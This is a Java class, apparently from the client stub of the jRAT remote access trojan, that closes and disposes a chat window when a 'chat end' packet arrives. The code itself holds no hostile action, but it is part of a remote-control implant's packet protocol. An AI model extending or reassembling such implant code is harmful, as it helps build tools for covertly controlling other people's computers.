package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet49ChatEnd extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat.setVisible(false);
		Connection.frameChat.dispose();
		Connection.frameChat = null;
	}

}
